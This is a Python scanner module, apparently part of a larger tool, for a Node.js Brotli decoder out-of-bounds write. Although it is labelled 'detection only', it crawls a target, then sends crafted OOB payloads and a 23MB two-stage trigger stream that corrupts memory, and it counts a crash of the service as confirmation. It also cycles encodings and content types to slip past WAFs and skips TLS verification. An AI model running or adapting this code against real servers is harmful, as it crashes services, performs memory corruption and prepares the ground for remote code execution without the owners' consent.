# cve_modules/node2shell.py
"""
CVE-2026-111497 — Node.js Brotli decoder OOB write (Node2Shell / HTTP2Shell)

Adaptasi dari PoC antid00t jadi modul scanning untuk main.py.

SCOPE: DETECTION ONLY.
  Modul ini cek apakah target punya attack surface Brotli (endpoint yang
  nerima Content-Encoding: br) + oracle differential (valid vs garbage
  brotli) + crash signal dari 23MB trigger stream.

  vulnerable=True HANYA kalau:
    - endpoint qualified (nerima br + differentiate valid/garbage), DAN
    - oracle konfirmasi VULN_SIGNAL atau service crash saat trigger.

  Full RCE (pinned ROP chain Node.js 24.22.0 Debian x86_64) TIDAK
  dilakukan di modul ini — itu cuma jalan di lab spesifik. Untuk full
  RCE, pakai tool asli di lab lu sendiri.

Mode:
  - full2=True  : semua varian payload + WAF ladder + stream trigger
  - full2=False : quick oracle only (default)
"""

from __future__ import annotations

import concurrent.futures as cf
import hashlib
import http.client
import re
import socket
import ssl
import struct
import time
import urllib.parse
from urllib.parse import urlparse


# ── metadata untuk main.py ──────────────────────────────────────────────

CVE_META = {
    "id": "CVE-2026-111497",
    "name": "Node.js Brotli OOB write (Node2Shell)",
    "func": "check_cve_2026_111497",
    "kwargs": {"full2": False},
    "priority": 50,
}


# ── konstanta ───────────────────────────────────────────────────────────

UA = "Mozilla/5.0 (compatible; CVE-2026-111497-PoC/3.0; http2shell)"

TRIGGER_SHA256 = ("b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359"
                  "fc8e1768e4df4")

PAYLOADS = [
    ("oob-base",     "200010414141fcffff07002228f00b60f7f41f000000"),
    ("oob-extended", "200010414141fcffff07002228f00b60f7f41f00000000"),
    ("oob-alt-b1z0", "20000010414141fcffff07002228f00b60f7f41f000000"),
    ("oob-pad8",     "200010414141fcffff07002228f00b60f7f41f00000000000000"),
]
PAYLOADS_FULL_EXTRA = [
    ("oob-huffman",  "200018414141fcffff07002228f00b60f7f41f000000"),
    ("oob-pad16",    "200010414141fcffff07002228f00b60f7f41f000000"
                     + "00" * 13),
]

VALID_BR = bytes.fromhex("8b00807b7d03")
GARBAGE_BR = b"\x00this-is-not-brotli!!"

CANDIDATE_PATHS = [
    "/api/ingest", "/api/ingest/", "/ingest", "/api/v1/ingest",
    "/api/data", "/api/events", "/upload", "/api/upload",
    "/api/v1/upload", "/webhook", "/api/webhook", "/api/submit",
    "/submit", "/capture", "/api/capture", "/report", "/api/report",
    "/collector", "/api/collector", "/api/process", "/process",
    "/api/queue", "/queue", "/api/files", "/files", "/api", "/",
]

SSL_CTX = ssl._create_unverified_context()

WAF_SIG_RE = re.compile(
    r"mod[_-]?security|cloudflare|owasp|coraza|sucuri|wordfence|batcache"
    r"|request\s+blocked|security\s+rule|waf|firewall", re.I)

VULN_RE = re.compile(r"(?<![a-z])block[_ ]?length(?![a-z])", re.I)
PATCH_RE = re.compile(r"(?<![a-z])block[_ ]?switch(?![a-z])", re.I)
NEUTRAL_RE = re.compile(r"z_buf_error|unexpected end of file", re.I)
DECODE_ERR_RE = re.compile(
    r"err__error|z_buf_error|z_data_error|brotli\.error|brotlidecompress"
    r"|decompression\s+failed|failed\s+to\s+decompress|\bbr_\w*error\b",
    re.I)
SUCCESS_HINT_RE = re.compile(
    r'"ok"\s*:\s*true|\bsuccess\b|\baccepted\b|^DONE', re.I | re.M)


# ── bit writer (dipertahankan dari tool asli) ───────────────────────────

class Bits:
    def __init__(self):
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value, count):
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value):
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self):
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def _one_symbol_tree(bits, alphabet_size, symbol):
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def _varlen_u8(bits, value):
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def _command_tail(bits, distance_extra, command_count):
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1
    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)


def generate_stream():
    bits = Bits()
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)
    _varlen_u8(bits, 0)
    _varlen_u8(bits, 1)
    _one_symbol_tree(bits, 4, 0)
    _one_symbol_tree(bits, 26, 25)
    bits.put(0xFFFFFF, 24)
    _varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    _varlen_u8(bits, 0)
    _varlen_u8(bits, 0)
    _one_symbol_tree(bits, 256, 0)
    _one_symbol_tree(bits, 704, 130)
    _one_symbol_tree(bits, 704, 130)
    _one_symbol_tree(bits, 400, 184)
    _command_tail(bits, 4, 1 << 24)
    return bits.finish()


_TRIGGER_CACHE = None


def _trigger_stages():
    global _TRIGGER_CACHE
    if _TRIGGER_CACHE is not None:
        return _TRIGGER_CACHE
    trigger = generate_stream()
    digest = hashlib.sha256(trigger).hexdigest()
    if digest != TRIGGER_SHA256:
        raise RuntimeError(f"trigger hash mismatch: {digest}")
    first = trigger + b"\x00" * 3
    second = bytearray(127)
    second[7] = 8
    struct.pack_into("<i", second, 15, 0x7FFFFFFF)
    struct.pack_into("<I", second, 19, 0x7FFFFFFF)
    struct.pack_into("<I", second, 23, 0x7FFFFFFF)
    _TRIGGER_CACHE = (first, bytes(second))
    return _TRIGGER_CACHE


# ── HTTP helpers ────────────────────────────────────────────────────────

class HttpError(Exception):
    def __init__(self, kind, detail=""):
        super().__init__(f"{kind}: {detail}")
        self.kind = kind


def _http_req(url, method="POST", body=b"", headers=None,
              timeout=10.0, max_body=65536):
    t0 = time.time()
    u = urlparse(url if "://" in url else "http://" + url)
    if u.scheme not in ("http", "https") or not u.hostname:
        raise HttpError("proto", url)
    try:
        port = u.port
    except ValueError:
        raise HttpError("proto", url)
    try:
        if u.scheme == "https":
            conn = http.client.HTTPSConnection(
                u.hostname, port or 443, timeout=timeout, context=SSL_CTX)
        else:
            conn = http.client.HTTPConnection(
                u.hostname, port or 80, timeout=timeout)
        try:
            path = u.path or "/"
            if u.query:
                path += "?" + u.query
            hdrs = {"User-Agent": UA, "Accept": "*/*",
                    "Content-Length": str(len(body))}
            if headers:
                hdrs.update(headers)
            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            data = resp.read(max_body)
            return resp.status, dict(resp.getheaders()), data
        finally:
            conn.close()
    except socket.timeout:
        raise HttpError("timeout", url)
    except ConnectionRefusedError:
        raise HttpError("refused", url)
    except (ConnectionResetError, http.client.RemoteDisconnected,
            BrokenPipeError):
        raise HttpError("reset", url)
    except (OSError, http.client.HTTPException) as e:
        raise HttpError("error", f"{type(e).__name__}: {e}")


def _waf_blocked(status, headers, body):
    if status in (403, 406, 413, 418, 429, 501):
        return True
    blob = body[:2048].decode("utf-8", "replace")
    server = " ".join(f"{k}: {v}" for k, v in headers.items())
    return bool(WAF_SIG_RE.search(blob) or WAF_SIG_RE.search(server))


def _two_stage_post(host, port, path, first, second, timeout=60.0,
                    stage_delay=0.5, mode="chunked", enc_case="br",
                    content_type="application/json"):
    total = len(first) + len(second)
    if mode == "cl-split":
        headers = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Encoding: {enc_case}\r\n"
            f"Content-Length: {total}\r\nConnection: close\r\n\r\n"
        ).encode()
    else:
        headers = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Encoding: {enc_case}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    with socket.create_connection((host, port), timeout=timeout) as conn:
        conn.settimeout(timeout)
        if mode == "cl-split":
            conn.sendall(headers + first)
            time.sleep(stage_delay)
            try:
                conn.sendall(second)
            except OSError:
                return b""
        else:
            chunk_hdr = f"{len(first):x}\r\n".encode()
            conn.sendall(headers + chunk_hdr + first + b"\r\n")
            time.sleep(stage_delay)
            try:
                conn.sendall(f"{len(second):x}\r\n".encode() + second
                             + b"\r\n0\r\n\r\n")
            except OSError:
                return b""
        out = bytearray()
        try:
            while len(out) < 65536:
                part = conn.recv(min(4096, 65536 - len(out)))
                if not part:
                    break
                out.extend(part)
        except OSError:
            pass
        return bytes(out)


# ── classifier ──────────────────────────────────────────────────────────

def _classify_body(status, body):
    text = body.decode("utf-8", "replace")
    if PATCH_RE.search(text):
        return "PATCHED_SIGNAL", text.strip()[:200]
    if VULN_RE.search(text):
        return "VULN_SIGNAL", text.strip()[:200]
    if NEUTRAL_RE.search(text):
        return "NEUTRAL_TRUNC", text.strip()[:200]
    return None, text.strip()[:200]


def _looks_failed(status, body):
    text = body.decode("utf-8", "replace")
    return status >= 400 or bool(DECODE_ERR_RE.search(text))


def _looks_succeeded(status, body):
    text = body.decode("utf-8", "replace")
    return status < 400 or bool(SUCCESS_HINT_RE.search(text))


# ── endpoint discovery ──────────────────────────────────────────────────

def _fetch_page(base, page, timeout):
    try:
        _s, _h, body = _http_req(base + page, "GET", b"", None, timeout)
        return body.decode("utf-8", "replace")[:65536]
    except HttpError:
        return ""


def _crawl_paths(base, timeout):
    paths = []
    with cf.ThreadPoolExecutor(max_workers=3) as ex:
        f_home = ex.submit(_fetch_page, base, "/", timeout)
        f_robots = ex.submit(_fetch_page, base, "/robots.txt", timeout)
        f_sitemap = ex.submit(_fetch_page, base, "/sitemap.xml", timeout)
    home = f_home.result()
    robots = f_robots.result()
    sitemap = f_sitemap.result()

    for m in re.findall(r"""(?:href|action|src|url)=["']([^"']+)["']""",
                        home, re.I):
        u = urllib.parse.urlparse(m)
        if u.path and u.path not in ("/",) \
                and not u.path.startswith(("http", "//")):
            paths.append(u.path)
    for m in re.findall(r"(?:Disallow|Allow):\s*(/\S*)", robots, re.I):
        if m.strip("/"):
            paths.append(m.split("?")[0])
    for m in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", sitemap, re.I):
        u = urllib.parse.urlparse(m)
        if u.path and u.path not in ("/",):
            paths.append(u.path)
    for m in re.findall(r'"(/(?:api|v\d)/[A-Za-z0-9_\-/.]{2,40})"', home):
        paths.append(m)
    hint = re.findall(
        r"(/(?:[A-Za-z0-9._\-]+)+(?:/[A-Za-z0-9._\-]+)*)",
        home + robots)
    paths += [p for p in hint if 3 < len(p) < 48]
    seen, uniq = set(), []
    for p in paths:
        if (p not in seen and p.startswith("/") and ":" not in p
                and not p.startswith("//")):
            seen.add(p)
            uniq.append(p)
    return uniq[:12]


def _probe_endpoint(base, path, timeout):
    ladder = [
        ("application/json", "br"), ("application/json", "BR"),
        ("text/plain", "br"), ("application/octet-stream", "br"),
    ]
    ev = {"path": path}
    for ctype, enc in ladder:
        try:
            s1, h1, b1 = _http_req(
                base + path, "POST", VALID_BR,
                {"Content-Type": ctype, "Content-Encoding": enc},
                timeout)
            s2, h2, b2 = _http_req(
                base + path, "POST", GARBAGE_BR,
                {"Content-Type": ctype, "Content-Encoding": enc},
                timeout)
        except HttpError as e:
            return False, {"path": path, "error": e.kind}
        if _waf_blocked(s1, h1, b1) or _waf_blocked(s2, h2, b2):
            ev[f"waf:{ctype}/{enc}"] = True
            continue
        qualified = _looks_succeeded(s1, b1) and _looks_failed(s2, b2)
        return qualified, {
            "path": path, "content_type": ctype, "encoding": enc,
            "valid": {"status": s1,
                      "body": b1[:100].decode("utf-8", "replace")},
            "garbage": {"status": s2,
                        "body": b2[:100].decode("utf-8", "replace")},
        }
    ev["waf_all_rungs"] = True
    return False, ev


def _qualify_endpoints(base, candidates, timeout,
                        workers=8, limit=40):
    cands = candidates[:limit]

    def work(path):
        return path, _probe_endpoint(base, path, timeout)

    done = {}
    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for fut in cf.as_completed([ex.submit(work, p) for p in cands]):
            path, result = fut.result()
            done[path] = result
    evidence = [done[p][1] for p in cands if p in done]
    for p in cands:
        if p in done and done[p][0]:
            return p, evidence
    return None, evidence


def _endpoint_alive(base, endpoint, timeout):
    try:
        _http_req(base + endpoint, "POST", VALID_BR,
                  {"Content-Type": "application/json",
                   "Content-Encoding": "br"}, timeout)
        return True
    except HttpError:
        return False


# ── oracle & stream ─────────────────────────────────────────────────────

def _phase_oracle(base, endpoint, timeout, full2):
    payloads = list(PAYLOADS) + (PAYLOADS_FULL_EXTRA if full2 else [])
    votes = {"VULN_SIGNAL": 0, "PATCHED_SIGNAL": 0, "NEUTRAL_TRUNC": 0}
    waf_hits = 0
    rounds = 3 if full2 else 2
    for name, hexstr in payloads:
        for rnd in range(1, rounds + 1):
            blocked = False
            for ctype, enc in (("application/json", "br"),
                                ("text/plain", "BR")):
                try:
                    s, h, b = _http_req(
                        base + endpoint, "POST", bytes.fromhex(hexstr),
                        {"Content-Type": ctype, "Content-Encoding": enc},
                        timeout)
                except HttpError:
                    break
                if _waf_blocked(s, h, b):
                    blocked = True
                    waf_hits += 1
                    continue
                vote, _snip = _classify_body(s, b)
                if vote:
                    votes[vote] += 1
                blocked = False
                break
            if votes["VULN_SIGNAL"] >= 1 \
                    or votes["PATCHED_SIGNAL"] >= 2:
                return votes, waf_hits
    return votes, waf_hits


def _phase_stream(host, port, base, endpoint, timeout, full2):
    first, second = _trigger_stages()
    modes = ([("cl-split", "br"), ("chunked", "br"), ("chunked", "BR")]
             if full2 else [("chunked", "br")])
    out = {"result": "inconclusive"}
    for mode, enc in modes:
        t0 = time.time()
        try:
            resp = _two_stage_post(host, port, endpoint, first, second,
                                   timeout=max(timeout, 60.0),
                                   mode=mode, enc_case=enc)
        except (OSError, HttpError):
            resp = b""
        elapsed = time.time() - t0
        time.sleep(0.3)
        dead = not _endpoint_alive(base, endpoint, timeout)
        vote, _ = _classify_body(200, resp)
        out = {"mode": mode, "elapsed_s": round(elapsed, 2),
               "signal": vote or ("DEAD" if dead else "none"),
               "service_died": dead,
               "response": resp[:200].decode("utf-8", "replace")}
        if vote == "PATCHED_SIGNAL" and not dead:
            out["result"] = "patched: instant -17"
            return out
        if dead:
            out["result"] = "service CRASHED (memory corruption proven)"
            return out
        if elapsed > 2.0 or vote in ("VULN_SIGNAL", "NEUTRAL_TRUNC"):
            out["result"] = ("stream fully consumed in corrupted state "
                             "(OOB writes performed)")
            return out
    return out


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_111497(target_url: str,
                           timeout: float = 10.0,
                           full2: bool = False,
                           threads: int = 8) -> dict:
    """
    Cek target terhadap CVE-2026-111497.

    HANYA DETEKSI. Nggak nyoba full RCE (pinned ROP chain cuma jalan di
    Node.js 24.22.0 Debian bookworm x86_64).

    Return:
        {
            "vulnerable": bool,   # True HANYA kalau crash/exploit signal
            "evidence":   str | None,
            "reason":     str,
            "endpoint":   str | None,
        }
    """
    url = target_url if "://" in target_url else "http://" + target_url
    u = urlparse(url)
    host = u.hostname or ""
    try:
        port = u.port or (443 if u.scheme == "https" else 80)
    except ValueError:
        return {"vulnerable": False, "evidence": None,
                "reason": "invalid_port", "endpoint": None}

    base = f"{u.scheme}://{host}:{port}"

    result = {"vulnerable": False, "evidence": None, "reason": "",
              "endpoint": None}

    # ── reachability ────────────────────────────────────────────────
    try:
        _http_req(base + "/", "GET", b"", None, timeout)
    except HttpError as e:
        result["reason"] = f"unreachable: {e.kind}"
        return result

    # ── tahap 1: kumpulin kandidat path & qualify ───────────────────
    candidates = []
    if u.path and u.path != "/":
        candidates.append(u.path)
    candidates += _crawl_paths(base, timeout)
    candidates += [p for p in CANDIDATE_PATHS if p not in candidates]

    endpoint, _evs = _qualify_endpoints(
        base, candidates, timeout, workers=max(4, threads))
    result["endpoint"] = endpoint
    if not endpoint:
        result["reason"] = "no_brotli_attack_surface"
        return result

    # ── tahap 2: oracle differential ────────────────────────────────
    votes, waf_hits = _phase_oracle(base, endpoint, timeout, full2)
    vulnerable = votes["VULN_SIGNAL"] > 0

    if votes["PATCHED_SIGNAL"] > 0 and not vulnerable:
        result["reason"] = "patched_block_switch"
        result["evidence"] = (f"endpoint={endpoint}, "
                              f"patched signal detected")
        return result

    if not vulnerable:
        # ── tahap 3: stream trigger (crash test) ────────────────────
        stream = _phase_stream(host, port, base, endpoint, timeout, full2)
        result["evidence"] = (f"endpoint={endpoint}, "
                              f"stream={stream.get('result', '')}, "
                              f"signal={stream.get('signal', '')}")
        if stream.get("service_died"):
            result["vulnerable"] = True
            result["reason"] = "memory_corruption_confirmed_crash"
            return result
        if stream.get("signal") == "PATCHED_SIGNAL":
            result["reason"] = "patched_block_switch_on_trigger"
            return result
        if stream.get("signal") in ("VULN_SIGNAL", "NEUTRAL_TRUNC"):
            result["vulnerable"] = True
            result["reason"] = "vuln_signal_on_stream"
            return result
        result["reason"] = "ambiguous_oracle_suspect"
        return result

    # oracle konfirmasi vuln via payload
    result["vulnerable"] = True
    result["reason"] = "vuln_signal_from_oracle"
    result["evidence"] = (f"endpoint={endpoint}, "
                          f"votes=VULN:{votes['VULN_SIGNAL']}, "
                          f"PATCHED:{votes['PATCHED_SIGNAL']}")
    return result